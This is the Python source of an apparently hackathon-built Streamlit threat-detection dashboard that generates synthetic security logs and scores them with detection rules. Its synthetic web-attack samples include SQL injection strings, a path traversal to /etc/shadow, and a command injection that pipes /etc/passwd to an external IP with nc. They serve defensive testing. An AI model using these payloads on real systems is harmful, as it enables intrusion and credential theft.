"""
AEGIS AI — AI-Powered Cyber Threat Detection & Incident Response Platform
A modern, dark navy-blue cybersecurity operations dashboard built with Streamlit.
Designed for hackathon demonstration with 100% synthetic, self-contained telemetry.
"""

import streamlit as st
import pandas as pd
import numpy as np
import plotly.express as px
import plotly.graph_objects as go
from datetime import datetime, timedelta
import random
import json
import re

# ==============================================================================
# 1. PAGE CONFIGURATION & DARK NAVY BLUE THEME INJECTION
# ==============================================================================
st.set_page_config(
    page_title="AEGIS AI — Cyber Threat Detection",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Custom Cyber Dark Navy-Blue CSS
CYBER_CSS = """
<style>
    /* Google Fonts */
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap');

    :root {
        --bg-main: #060b18;
        --bg-card: #0b152b;
        --bg-card-hover: #101d3b;
        --bg-sidebar: #080f22;
        --accent-cyan: #00f2fe;
        --accent-blue: #3b82f6;
        --accent-indigo: #6366f1;
        --border-color: #1a294d;
        --text-primary: #f1f5f9;
        --text-secondary: #94a3b8;
        --text-muted: #64748b;
        
        --color-low: #10b981;
        --color-medium: #f59e0b;
        --color-high: #f97316;
        --color-critical: #ef4444;
    }

    /* Main background */
    .stApp {
        background-color: var(--bg-main);
        color: var(--text-primary);
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    }

    /* Sidebar */
    section[data-testid="stSidebar"] {
        background-color: var(--bg-sidebar);
        border-right: 1px solid var(--border-color);
    }
    section[data-testid="stSidebar"] .block-container {
        padding-top: 2rem;
    }

    /* Top Navigation / Header styling */
    .aegis-header {
        background: linear-gradient(135deg, #09142b 0%, #0d1e40 50%, #081026 100%);
        border: 1px solid #1e3566;
        border-radius: 14px;
        padding: 1.5rem 2rem;
        margin-bottom: 1.5rem;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.05);
        position: relative;
        overflow: hidden;
    }
    .aegis-header::before {
        content: "";
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 3px;
        background: linear-gradient(90deg, #00f2fe, #3b82f6, #6366f1, #00f2fe);
        background-size: 200% auto;
        animation: cyber-gradient 4s linear infinite;
    }
    @keyframes cyber-gradient {
        0% { background-position: 0% center; }
        100% { background-position: 200% center; }
    }

    /* Glowing Metric Cards */
    .metric-card {
        background: linear-gradient(180deg, #0d1935 0%, #0a1329 100%);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1.25rem 1.25rem;
        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.35);
        transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
        position: relative;
    }
    .metric-card:hover {
        transform: translateY(-2px);
        border-color: #2e4a87;
        box-shadow: 0 8px 24px rgba(0, 242, 254, 0.12);
    }
    .metric-title {
        font-size: 0.78rem;
        text-transform: uppercase;
        letter-spacing: 0.1em;
        color: var(--text-secondary);
        font-weight: 600;
        margin-bottom: 0.4rem;
        display: flex;
        align-items: center;
        gap: 0.4rem;
    }
    .metric-value {
        font-size: 2.1rem;
        font-weight: 800;
        font-family: 'JetBrains Mono', monospace;
        letter-spacing: -0.02em;
        line-height: 1.1;
    }
    .metric-footer {
        font-size: 0.75rem;
        color: var(--text-muted);
        margin-top: 0.5rem;
        display: flex;
        align-items: center;
        gap: 0.3rem;
    }

    /* Severity Badges */
    .badge {
        display: inline-block;
        padding: 0.2rem 0.65rem;
        border-radius: 9999px;
        font-size: 0.72rem;
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 0.05em;
        font-family: 'JetBrains Mono', monospace;
    }
    .badge-critical {
        background-color: rgba(239, 68, 68, 0.18);
        color: #fca5a5;
        border: 1px solid rgba(239, 68, 68, 0.5);
        box-shadow: 0 0 8px rgba(239, 68, 68, 0.25);
    }
    .badge-high {
        background-color: rgba(249, 115, 22, 0.18);
        color: #fdba74;
        border: 1px solid rgba(249, 115, 22, 0.5);
    }
    .badge-medium {
        background-color: rgba(245, 158, 11, 0.18);
        color: #fde047;
        border: 1px solid rgba(245, 158, 11, 0.5);
    }
    .badge-low {
        background-color: rgba(16, 185, 129, 0.18);
        color: #6ee7b7;
        border: 1px solid rgba(16, 185, 129, 0.5);
    }
    .badge-shield {
        background: rgba(0, 242, 254, 0.12);
        color: #00f2fe;
        border: 1px solid rgba(0, 242, 254, 0.4);
    }

    /* Cyber Card Container */
    .cyber-box {
        background-color: var(--bg-card);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1.25rem;
        margin-bottom: 1.25rem;
    }

    /* Code & Log Monospace Snippet */
    .cyber-code {
        font-family: 'JetBrains Mono', monospace;
        background-color: #040813;
        border: 1px solid #15223d;
        color: #38bdf8;
        padding: 0.6rem 0.8rem;
        border-radius: 8px;
        font-size: 0.82rem;
        overflow-x: auto;
    }

    /* Pulse Status Indicator */
    .pulse-dot {
        display: inline-block;
        width: 8px;
        height: 8px;
        border-radius: 50%;
        background-color: #10b981;
        box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
        animation: pulse 1.8s infinite cubic-bezier(0.66, 0, 0, 1);
        margin-right: 6px;
    }
    @keyframes pulse {
        0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
        70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
        100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
    }

    /* Tabs Styling */
    .stTabs [data-baseweb="tab-list"] {
        gap: 8px;
        background-color: #070e20;
        padding: 6px;
        border-radius: 10px;
        border: 1px solid var(--border-color);
    }
    .stTabs [data-baseweb="tab"] {
        height: 42px;
        border-radius: 8px;
        color: var(--text-secondary);
        font-weight: 600;
        padding: 0 16px;
        font-size: 0.88rem;
        border: none;
    }
    .stTabs [aria-selected="true"] {
        background-color: #16264c !important;
        color: #00f2fe !important;
        border: 1px solid #284482 !important;
    }

    /* Dataframe tweaks */
    div[data-testid="stDataFrame"] {
        border: 1px solid var(--border-color);
        border-radius: 8px;
        overflow: hidden;
    }
</style>
"""
st.markdown(CYBER_CSS, unsafe_allow_html=True)

# ==============================================================================
# 2. DEFINITION OF ASSETS, KNOWN THREAT SIGNATURES & SIMULATION DATA
# ==============================================================================
ASSETS = {
    "10.0.1.5": {"name": "DC-PROD-01", "role": "Active Directory / Domain Controller", "tier": "Crown Jewel", "base_risk": 15},
    "10.0.1.10": {"name": "DB-PAYMENTS-01", "role": "PostgreSQL Cardholder Database", "tier": "Crown Jewel", "base_risk": 15},
    "10.0.2.14": {"name": "WEB-GATEWAY-01", "role": "Nginx Public Web Portal", "tier": "High Value", "base_risk": 10},
    "10.0.2.22": {"name": "API-AUTH-SVC", "role": "OAuth2 / JWT Token Authority", "tier": "High Value", "base_risk": 10},
    "10.0.3.50": {"name": "WS-FINANCE-09", "role": "CFO Management Workstation", "tier": "Standard Asset", "base_risk": 5},
    "10.0.3.88": {"name": "WS-DEV-14", "role": "Core Engineering Workstation", "tier": "Standard Asset", "base_risk": 5},
    "10.0.4.100": {"name": "SAN-BACKUP-01", "role": "Enterprise Backup Repository", "tier": "High Value", "base_risk": 10},
}

THREAT_ACTOR_IPS = [
    {"ip": "185.220.101.5", "country": "Germany", "asn": "Tor Exit Node Network", "threat_actor": "APT-TOR-SHADOW"},
    {"ip": "45.154.255.89", "country": "Netherlands", "asn": "Bulletproof VPS Hosting", "threat_actor": "FinStorm-Crawler"},
    {"ip": "194.26.29.112", "country": "Russia", "asn": "DarkScan Autonomous Subnet", "threat_actor": "BruteBot-900"},
    {"ip": "103.145.13.4", "country": "Singapore", "asn": "Compromised Corporate Proxy", "threat_actor": "ProxyMesh-Lurker"},
    {"ip": "198.51.100.22", "country": "United States", "asn": "Suspicious VPN Gateway", "threat_actor": "Unknown Actor"},
    {"ip": "203.0.113.77", "country": "Brazil", "asn": "Mirai-variant Botnet Drone", "threat_actor": "Mirai-Cluster"},
    {"ip": "178.62.204.11", "country": "United Kingdom", "asn": "Automated Cloud Recon", "threat_actor": "CloudSweeper-Agent"},
]

INTERNAL_IPS = [
    {"ip": "10.0.3.12", "country": "Internal LAN", "asn": "HQ Local Subnet", "threat_actor": "Internal User"},
    {"ip": "10.0.3.15", "country": "Internal LAN", "asn": "HQ Local Subnet", "threat_actor": "Internal User"},
    {"ip": "10.0.2.100", "country": "Internal DMZ", "asn": "DMZ Microsegment", "threat_actor": "Internal App"},
    {"ip": "172.16.10.8", "country": "Internal VPN", "asn": "Secure Employee Wireguard", "threat_actor": "Remote Worker"},
]

USERS = ["admin", "root", "sarah.connors", "alex.miller", "svc_backup", "jdoe", "dbadmin", "finance_lead"]

# ==============================================================================
# 3. SYNTHETIC TELEMETRY GENERATION ENGINE
# ==============================================================================
def generate_synthetic_telemetry(num_events=200, seed=42, inject_campaign=None):
    """
    Generates realistic cybersecurity logs with mixed normal traffic and malicious vectors.
    100% synthetic, secure, and self-contained.
    """
    random.seed(seed)
    np.random.seed(seed)

    events = []
    base_time = datetime.now() - timedelta(hours=4)
    
    # Pre-generate campaign attacker & targets if chosen
    campaign_attacker = random.choice(THREAT_ACTOR_IPS)
    crown_target = random.choice(["10.0.1.5", "10.0.1.10"])
    
    # Track state for sequence correlation
    failed_login_counters = {}
    port_scan_counters = {}
    user_locations = {}

    for i in range(num_events):
        # Staggered chronological timestamps
        delta_seconds = random.randint(5, 75)
        current_time = base_time + timedelta(seconds=delta_seconds * i)
        timestamp_str = current_time.strftime("%Y-%m-%d %H:%M:%S")
        event_id = f"EVT-{10000 + i}"

        # Choose event category:
        # Bias towards specific scenario if selected, otherwise realistic SOC ratio (35% threat, 65% normal)
        dice = random.random()
        
        if inject_campaign == "brute_force" and i > (num_events - 25):
            category = "brute_force"
        elif inject_campaign == "port_scan" and i > (num_events - 30):
            category = "port_scan"
        elif inject_campaign == "web_exploit" and i > (num_events - 20):
            category = "web_exploit"
        elif inject_campaign == "data_exfil" and i > (num_events - 15):
            category = "data_exfil"
        elif inject_campaign == "impossible_travel" and i > (num_events - 10):
            category = "impossible_travel"
        else:
            if dice < 0.20:
                category = "brute_force"
            elif dice < 0.30:
                category = "port_scan"
            elif dice < 0.40:
                category = "web_exploit"
            elif dice < 0.46:
                category = "sensitive_port"
            elif dice < 0.52:
                category = "data_exfil"
            elif dice < 0.56:
                category = "impossible_travel"
            else:
                category = "normal"

        # Generate event specifics based on category
        if category == "brute_force":
            actor = campaign_attacker if random.random() < 0.7 else random.choice(THREAT_ACTOR_IPS)
            src_ip = actor["ip"]
            geo = actor["country"]
            target_ip = crown_target if random.random() < 0.5 else "10.0.2.14"
            dest_port = random.choice([22, 3389, 8080])
            user = random.choice(["root", "admin", "dbadmin", "svc_backup"])
            protocol = "SSH" if dest_port == 22 else ("RDP" if dest_port == 3389 else "HTTPS")
            bytes_transferred = random.randint(450, 1200)
            
            # Increment velocity tracker
            failed_login_counters[src_ip] = failed_login_counters.get(src_ip, 0) + 1
            streak = failed_login_counters[src_ip]
            
            event_type = "Failed Authentication Attempt"
            payload = f"AUTH_FAIL: pam_unix({protocol.lower()}): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={src_ip} user={user} (attempt #{streak})"

        elif category == "port_scan":
            actor = campaign_attacker if random.random() < 0.7 else random.choice(THREAT_ACTOR_IPS)
            src_ip = actor["ip"]
            geo = actor["country"]
            target_ip = random.choice(list(ASSETS.keys()))
            probed_port = random.choice([21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 1433, 3306, 3389, 8080, 8443, 9001])
            dest_port = probed_port
            user = "-"
            protocol = "TCP"
            bytes_transferred = random.randint(64, 128)
            
            port_scan_counters.setdefault(src_ip, set()).add(dest_port)
            unique_ports = len(port_scan_counters[src_ip])
            
            event_type = "Unusual Connection Probe"
            payload = f"TCP_SYN: Stealth half-open probe received on port {dest_port} from {src_ip} [TCP Window: 1024, TTL: 54, Distinct ports probed: {unique_ports}]"

        elif category == "web_exploit":
            actor = random.choice(THREAT_ACTOR_IPS)
            src_ip = actor["ip"]
            geo = actor["country"]
            target_ip = "10.0.2.14" # WEB-GATEWAY-01
            dest_port = random.choice([80, 443])
            user = "web_visitor"
            protocol = "HTTPS"
            bytes_transferred = random.randint(1800, 4200)
            
            attack_patterns = [
                ("SQL Injection Attempt", "GET /api/v1/users?id=1%20UNION%20SELECT%20NULL,username,password_hash%20FROM%20admin_accounts-- HTTP/1.1 (Payload: UNION SELECT)"),
                ("SQL Injection Attempt", "POST /auth/login HTTP/1.1 payload: username=' OR 1=1--&password=x (Payload: Tautology Bypass)"),
                ("Path Traversal Probe", "GET /download?file=../../../../../../etc/shadow%00.png HTTP/1.1 (Payload: Directory Traversal)"),
                ("Command Injection Attempt", "POST /api/diagnostics/ping HTTP/1.1 target=127.0.0.1;cat /etc/passwd|nc 45.154.255.89 9001 (Payload: Pipe Shell Exec)")
            ]
            chosen_pattern = random.choice(attack_patterns)
            event_type = chosen_pattern[0]
            payload = chosen_pattern[1]

        elif category == "sensitive_port":
            actor = random.choice(THREAT_ACTOR_IPS)
            src_ip = actor["ip"]
            geo = actor["country"]
            target_ip = random.choice(["10.0.1.5", "10.0.1.10", "10.0.4.100"])
            dest_port = random.choice([445, 1433, 3389, 23])
            user = "unauthenticated"
            protocol = "SMB" if dest_port == 445 else ("MSSQL" if dest_port == 1433 else "RDP")
            bytes_transferred = random.randint(250, 950)
            event_type = "Sensitive Port Access Attempt"
            payload = f"FIREWALL_ALERT: Direct external unencrypted ingress to sensitive internal service on port {dest_port} ({protocol}) from non-whitelisted IP {src_ip}"

        elif category == "data_exfil":
            src_ip = "10.0.3.50" # WS-FINANCE-09
            geo = "Internal LAN"
            target_ip = random.choice([t["ip"] for t in THREAT_ACTOR_IPS])
            dest_port = random.choice([8443, 9001, 53])
            user = "finance_lead"
            protocol = "HTTPS-Encrypted"
            # Huge byte transfer anomaly
            bytes_transferred = random.randint(120_000_000, 380_000_000)
            event_type = "Abnormal Data Exfiltration"
            payload = f"ANOMALY_TRAFFIC: High-volume outbound transmission {bytes_transferred // (1024*1024)} MB sent to unverified external destination {target_ip}:{dest_port} over 18 seconds"

        elif category == "impossible_travel":
            user = "sarah.connors"
            # User logs in from London, then 15 minutes later from Tokyo
            previous_loc = user_locations.get(user, {"country": "United Kingdom", "ip": "178.62.204.11"})
            new_country = "Russia" if previous_loc["country"] != "Russia" else "Singapore"
            new_ip = "194.26.29.112" if new_country == "Russia" else "103.145.13.4"
            
            src_ip = new_ip
            geo = new_country
            target_ip = "10.0.2.22" # API-AUTH-SVC
            dest_port = 443
            protocol = "HTTPS"
            bytes_transferred = random.randint(1200, 3400)
            user_locations[user] = {"country": new_country, "ip": new_ip}
            
            event_type = "Impossible Travel Velocity Anomaly"
            payload = f"IDENTITY_ALERT: Account '{user}' logged in from {new_country} ({src_ip}) exactly 14 minutes after active session in {previous_loc['country']} ({previous_loc['ip']}) [Speed: ~4,200 mph]"

        else: # Normal Traffic
            internal_source = random.choice(INTERNAL_IPS)
            src_ip = internal_source["ip"]
            geo = internal_source["country"]
            target_ip = random.choice(["10.0.2.14", "10.0.2.22", "10.0.4.100"])
            dest_port = random.choice([80, 443, 53])
            user = random.choice(USERS)
            protocol = "HTTPS" if dest_port == 443 else ("DNS" if dest_port == 53 else "HTTP")
            bytes_transferred = random.randint(300, 8500)
            event_type = "Normal Telemetry"
            payload = f"LOG_INFO: GET /static/app.bundle.js 200 OK duration=12ms response_size={bytes_transferred} user='{user}' proto={protocol}"

        events.append({
            "event_id": event_id,
            "timestamp": timestamp_str,
            "source_ip": src_ip,
            "geo_country": geo,
            "destination_ip": target_ip,
            "destination_port": dest_port,
            "protocol": protocol,
            "user_account": user,
            "event_type": event_type,
            "raw_payload": payload,
            "bytes_transferred": bytes_transferred,
            "category": category
        })

    return pd.DataFrame(events)

# ==============================================================================
# 4. RULE DETECTION ENGINE & AI RISK SCORING (FEATURES 3, 4, 6, 7)
# ==============================================================================
class AegisDetectionEngine:
    """
    Evaluates cybersecurity events using deterministic signature rules,
    contextual asset weighting, and automated explainable AI rationale.
    """

    @staticmethod
    def analyze_event(row, history_df):
        """
        Analyzes a single event row and returns risk score, severity,
        matched rules, explainability rationale, and recommended response.
        """
        src_ip = row["source_ip"]
        dest_ip = row["destination_ip"]
        dest_port = row["destination_port"]
        user = row["user_account"]
        event_type = row["event_type"]
        payload = row["raw_payload"]
        bytes_tx = row["bytes_transferred"]
        category = row.get("category", "normal")

        # Base scoring
        base_score = 10
        rules_triggered = []
        explanation_bullets = []
        mitre_tactic = "Initial Access"
        mitre_technique = "T1078 - Valid Accounts"
        recommended_actions = []

        # ----------------------------------------------------------------------
        # Rule 1: Repeated Failed Logins (Brute Force Detection)
        # ----------------------------------------------------------------------
        if category == "brute_force" or "AUTH_FAIL" in payload or "Failed Authentication" in event_type:
            # Count recent failures from this IP in history
            ip_failures = history_df[
                (history_df["source_ip"] == src_ip) & 
                (history_df["event_type"].str.contains("Authentication|AUTH", case=False, na=False))
            ]
            fail_count = len(ip_failures) + 1
            
            if fail_count >= 3:
                base_score = 75 + min(20, fail_count * 3)
                rule_id = "RULE-AUTH-001"
                rules_triggered.append(rule_id)
                mitre_tactic = "Credential Access"
                mitre_technique = "T1110.001 - Password Guessing / Brute Force"
                explanation_bullets.append(f"High-frequency failed authentication velocity: {fail_count} failed login attempts recorded from source IP {src_ip}.")
                explanation_bullets.append(f"Targeting privileged account '{user}' on port {dest_port}.")
                recommended_actions.append(f"Perimeter Firewall: Apply instant DROP rule for external IP {src_ip}.")
                recommended_actions.append(f"Identity: Temporarily lock account '{user}' and trigger mandatory MFA re-authentication.")
            else:
                base_score = 45
                rules_triggered.append("RULE-AUTH-LOW")
                mitre_tactic = "Credential Access"
                mitre_technique = "T1110 - Brute Force"
                explanation_bullets.append(f"Isolated single authentication failure for user '{user}'.")
                recommended_actions.append("Monitor account for subsequent repeated authentication failures.")

        # ----------------------------------------------------------------------
        # Rule 2: Unusual Connection & Port Scan Reconnaissance
        # ----------------------------------------------------------------------
        elif category == "port_scan" or "Stealth" in payload or "Unusual Connection" in event_type:
            probed_ports = history_df[
                (history_df["source_ip"] == src_ip) & 
                (history_df["event_type"].str.contains("Connection|Probe|Scan", case=False, na=False))
            ]["destination_port"].nunique() + 1
            
            if probed_ports >= 3:
                base_score = 72 + min(18, probed_ports * 2)
                rule_id = "RULE-RECON-002"
                rules_triggered.append(rule_id)
                mitre_tactic = "Reconnaissance"
                mitre_technique = "T1046 - Network Service Discovery"
                explanation_bullets.append(f"Horizontal/Vertical port sweep detected: {probed_ports} distinct network services probed by {src_ip}.")
                explanation_bullets.append(f"TCP SYN stealth packets observed without establishing handshake on port {dest_port}.")
                recommended_actions.append(f"Perimeter: Blacklist source subnet of {src_ip} at edge gateway for 24 hours.")
                recommended_actions.append(f"Network: Ensure closed port ICMP unreachable replies are rate-limited.")

        # ----------------------------------------------------------------------
        # Rule 3: Web Application Exploitation (SQLi / LFI / Path Traversal)
        # ----------------------------------------------------------------------
        elif category == "web_exploit" or any(kw in payload.upper() for kw in ["UNION SELECT", "' OR 1=1", "ETC/SHADOW", "ETC/PASSWD"]):
            base_score = 88
            rule_id = "RULE-WEB-003"
            rules_triggered.append(rule_id)
            mitre_tactic = "Initial Access"
            mitre_technique = "T1190 - Exploit Public-Facing Application"
            
            if "UNION" in payload.upper() or "OR 1=1" in payload.upper():
                attack_sub = "SQL Injection (SQLi)"
                explanation_bullets.append(f"Injected SQL syntax syntax pattern identified in HTTP payload: '{payload[:60]}...'.")
                explanation_bullets.append("Attempted database authentication bypass / data extraction signature.")
                recommended_actions.append("WAF: Inject WAF Virtual Patch to block SQL meta-characters on parameter.")
            else:
                attack_sub = "Directory Traversal / LFI"
                explanation_bullets.append(f"Arbitrary file access attempt pattern: Relative path escape strings ('../') identified.")
                recommended_actions.append("Web Server: Verify web root jail / chroot and sanitize input path variables.")
                
            recommended_actions.append(f"Edge Defense: Block IP {src_ip} at Cloudflare / AWS WAF edge.")

        # ----------------------------------------------------------------------
        # Rule 4: High-Risk Sensitive Port Exposure
        # ----------------------------------------------------------------------
        elif category == "sensitive_port" or dest_port in [445, 1433, 3389, 23]:
            base_score = 78
            rule_id = "RULE-NET-004"
            rules_triggered.append(rule_id)
            mitre_tactic = "Lateral Movement"
            mitre_technique = "T1021 - Remote Services"
            explanation_bullets.append(f"Unauthorized external connection directly to sensitive enterprise port {dest_port} ({row['protocol']}).")
            explanation_bullets.append("Service should not be publicly accessible outside internal zero-trust perimeter.")
            recommended_actions.append(f"Security Group: Terminate public route to port {dest_port} on asset {dest_ip}.")
            recommended_actions.append(f"Block remote IP {src_ip} from traversing border perimeter.")

        # ----------------------------------------------------------------------
        # Rule 5: Abnormal High-Volume Data Exfiltration
        # ----------------------------------------------------------------------
        elif category == "data_exfil" or bytes_tx > 50_000_000:
            base_score = 94
            rule_id = "RULE-EXFIL-005"
            rules_triggered.append(rule_id)
            mitre_tactic = "Exfiltration"
            mitre_technique = "T1048 - Exfiltration Over Alternative Protocol"
            mb_size = bytes_tx // (1024 * 1024)
            explanation_bullets.append(f"Severe bandwidth anomaly: {mb_size} MB uploaded to unverified external address {dest_ip}:{dest_port}.")
            explanation_bullets.append("Statistical deviation exceeds 12x normal baseline for internal workstation.")
            recommended_actions.append(f"Immediate Quarantine: Isolate host {src_ip} from enterprise network using EDR agent.")
            recommended_actions.append(f"Firewall: Sever outbound TCP connection to {dest_ip} immediately.")
            recommended_actions.append("SOC Forensics: Triage active processes and dump memory of suspicious network socket.")

        # ----------------------------------------------------------------------
        # Rule 6: Impossible Travel Velocity Anomaly
        # ----------------------------------------------------------------------
        elif category == "impossible_travel" or "Impossible Travel" in event_type:
            base_score = 92
            rule_id = "RULE-ID-006"
            rules_triggered.append(rule_id)
            mitre_tactic = "Defense Evasion"
            mitre_technique = "T1078.004 - Cloud / Identity Accounts"
            explanation_bullets.append(f"Geographic velocity violation: User '{user}' authenticated across 2 disparate countries in under 15 minutes.")
            explanation_bullets.append("Physical transit speed mathematically impossible without compromised session credentials or proxy hijacking.")
            recommended_actions.append(f"Identity Provider: Invalidate all active OAuth/SAML session tokens for '{user}'.")
            recommended_actions.append("Enforce step-up hardware token (FIDO2/WebAuthn) MFA challenge.")

        # ----------------------------------------------------------------------
        # Default Normal Telemetry
        # ----------------------------------------------------------------------
        else:
            base_score = random.randint(5, 25)
            rules_triggered.append("RULE-BENIGN-000")
            mitre_tactic = "Normal Operations"
            mitre_technique = "Standard Baseline"
            explanation_bullets.append("Traffic characteristics, payload entropy, and connection frequency match normal operational profile.")
            recommended_actions.append("No defensive action required. Routine SIEM indexing.")

        # Contextual Asset Criticality Modifier
        asset_info = ASSETS.get(dest_ip)
        if asset_info:
            base_score += asset_info["base_risk"]
            explanation_bullets.append(f"Target Asset Context: '{asset_info['name']}' ({asset_info['role']}) has Tier rating [{asset_info['tier']}]. Risk boosted by +{asset_info['base_risk']}.")

        # Cap Risk Score at 100
        final_risk_score = min(100, max(5, base_score))

        # Severity Classification
        if final_risk_score >= 88:
            severity = "Critical"
        elif final_risk_score >= 70:
            severity = "High"
        elif final_risk_score >= 40:
            severity = "Medium"
        else:
            severity = "Low"

        # Synthesize clear explainability rationale
        primary_rule = rules_triggered[0] if rules_triggered else "RULE-BENIGN"
        explanation_summary = f"Flagged under {primary_rule} (Score {final_risk_score}/100 - {severity}). " + " ".join(explanation_bullets[:2])

        return {
            "risk_score": final_risk_score,
            "severity": severity,
            "rule_code": primary_rule,
            "mitre_tactic": mitre_tactic,
            "mitre_technique": mitre_technique,
            "explanation_summary": explanation_summary,
            "explanation_bullets": explanation_bullets,
            "recommended_actions": recommended_actions
        }

# ==============================================================================
# 5. INCIDENT CORRELATION ENGINE (FEATURE 5)
# ==============================================================================
def correlate_incidents(analyzed_df):
    """
    Groups individual high/critical alerts into multi-stage attack incidents.
    Correlates based on common attacker IP, target host, or identity account.
    """
    # Filter for suspicious events (Score >= 60)
    threat_df = analyzed_df[analyzed_df["risk_score"] >= 60]
    incidents = []

    if threat_df.empty:
        return incidents

    # Correlation Group 1: By Attacker IP
    ip_groups = threat_df.groupby("source_ip")
    incident_counter = 101

    for src_ip, group in ip_groups:
        if len(group) >= 2 or group["risk_score"].max() >= 85:
            max_score = int(group["risk_score"].max())
            avg_score = int(group["risk_score"].mean())
            event_types = group["event_type"].unique().tolist()
            targets = group["destination_ip"].unique().tolist()
            target_names = [ASSETS.get(t, {}).get("name", t) for t in targets]
            tactics = group["mitre_tactic"].unique().tolist()
            
            # Severity for the aggregated incident
            inc_severity = "Critical" if max_score >= 88 else ("High" if max_score >= 70 else "Medium")
            
            # Formulate incident title and narrative
            if any("Brute Force" in et or "Authentication" in et for et in event_types) and any("Probe" in et or "Scan" in et for et in event_types):
                title = f"Coordinated Reconnaissance & Multi-Stage Brute-Force Campaign"
                narrative = f"Source IP {src_ip} performed systematic network reconnaissance followed by high-velocity credential brute-forcing targeting internal assets ({', '.join(target_names)})."
            elif any("SQL" in et or "Exploit" in et for et in event_types):
                title = f"Targeted Web Application Exploitation & Injection Assault"
                narrative = f"Adversary launched structured injection payloads against public web gateway {', '.join(target_names)} with intent to bypass authentication or extract sensitive records."
            elif any("Exfiltration" in et for et in event_types):
                title = f"High-Severity Outbound Data Exfiltration Anomaly"
                narrative = f"Abnormal outbound volume transmitted to external IP {src_ip}. Suspected exfiltration of proprietary documents or cardholder data."
            elif any("Impossible Travel" in et for et in event_types):
                title = f"Compromised Account Identity & Anomalous Geolocation Velocity"
                narrative = f"Multiple authentication events from disparate geolocations within minutes suggest credential theft or session token hijack."
            else:
                title = f"Correlated Multi-Vector Attack Campaign ({src_ip})"
                narrative = f"Multiple high-risk alerts linked to source {src_ip} spanning tactics: {', '.join(tactics)}."

            incidents.append({
                "incident_id": f"INC-2026-{incident_counter}",
                "title": title,
                "severity": inc_severity,
                "attacker_ip": src_ip,
                "origin_country": group["geo_country"].iloc[0],
                "event_count": len(group),
                "peak_risk_score": max_score,
                "impacted_assets": target_names,
                "tactics": tactics,
                "narrative": narrative,
                "status": "Open / Requires Review",
                "recommended_playbook": group["recommended_actions"].explode().dropna().unique().tolist()[:4],
                "event_ids": group["event_id"].tolist()
            })
            incident_counter += 1

    return incidents

# ==============================================================================
# 6. SESSION STATE INITIALIZATION
# ==============================================================================
if "events_df" not in st.session_state:
    # Initial generation with default 220 events
    raw_df = generate_synthetic_telemetry(num_events=220, seed=1337)
    
    # Run Detection Engine on initial dataset
    results = [AegisDetectionEngine.analyze_event(row, raw_df.iloc[:idx]) for idx, row in raw_df.iterrows()]
    results_df = pd.DataFrame(results)
    full_df = pd.concat([raw_df, results_df], axis=1)
    
    st.session_state.events_df = full_df
    st.session_state.incidents = correlate_incidents(full_df)
    st.session_state.containment_log = [
        {"timestamp": datetime.now().strftime("%H:%M:%S"), "action": "AEGIS AI Autonomous Core Initialized", "target": "Cluster-Wide", "status": "ACTIVE"}
    ]
    st.session_state.shield_active = True

# Helper to re-generate telemetry
def refresh_telemetry(num_events, seed, campaign=None):
    raw_df = generate_synthetic_telemetry(num_events=num_events, seed=seed, inject_campaign=campaign)
    results = [AegisDetectionEngine.analyze_event(row, raw_df.iloc[:idx]) for idx, row in raw_df.iterrows()]
    results_df = pd.DataFrame(results)
    full_df = pd.concat([raw_df, results_df], axis=1)
    st.session_state.events_df = full_df
    st.session_state.incidents = correlate_incidents(full_df)

# ==============================================================================
# 7. SIDEBAR: CONTROLS, INJECTION LAB & ADVANCED FILTERS (FEATURE 8)
# ==============================================================================
with st.sidebar:
    st.markdown("""
        <div style="display:flex; align-items:center; gap:10px; margin-bottom:1.2rem;">
            <div style="font-size: 2.2rem;">🛡️</div>
            <div>
                <div style="font-weight: 800; font-size: 1.25rem; color:#00f2fe; letter-spacing: -0.02em;">AEGIS AI</div>
                <div style="font-size: 0.72rem; color:#94a3b8; text-transform:uppercase; letter-spacing:0.08em;">Cyber Threat Platform</div>
            </div>
        </div>
    """, unsafe_allow_html=True)

    st.markdown("---")
    st.markdown("### ⚙️ Telemetry Controls")
    
    dataset_size = st.select_slider("Events Dataset Size", options=[100, 200, 350, 500], value=200)
    sim_seed = st.number_input("Random Seed (Reproducibility)", min_value=1, max_value=99999, value=1337)
    
    col_btn1, col_btn2 = st.columns(2)
    with col_btn1:
        if st.button("🔄 Generate Telemetry", use_container_width=True):
            refresh_telemetry(dataset_size, sim_seed)
            st.success("Telemetry regenerated!")
    with col_btn2:
        if st.button("🎲 Random Seed", use_container_width=True):
            new_seed = random.randint(100, 99999)
            refresh_telemetry(dataset_size, new_seed)
            st.rerun()

    st.markdown("---")
    st.markdown("### 🧪 Quick Attack Simulators")
    st.caption("Trigger synthetic attack campaigns into AEGIS AI:")
    
    col_atk1, col_atk2 = st.columns(2)
    with col_atk1:
        if st.button("⚡ Brute Force Storm", use_container_width=True):
            refresh_telemetry(dataset_size, sim_seed, campaign="brute_force")
            st.toast("Injected: SSH & RDP Credential Stuffing Campaign", icon="🚨")
            st.rerun()
        if st.button("🌐 Web SQLi Campaign", use_container_width=True):
            refresh_telemetry(dataset_size, sim_seed, campaign="web_exploit")
            st.toast("Injected: Web Application Injection Assault", icon="💉")
            st.rerun()
            
    with col_atk2:
        if st.button("🔍 Port Scan Recon", use_container_width=True):
            refresh_telemetry(dataset_size, sim_seed, campaign="port_scan")
            st.toast("Injected: Stealth Port Sweep Reconnaissance", icon="📡")
            st.rerun()
        if st.button("📤 Data Exfil Burst", use_container_width=True):
            refresh_telemetry(dataset_size, sim_seed, campaign="data_exfil")
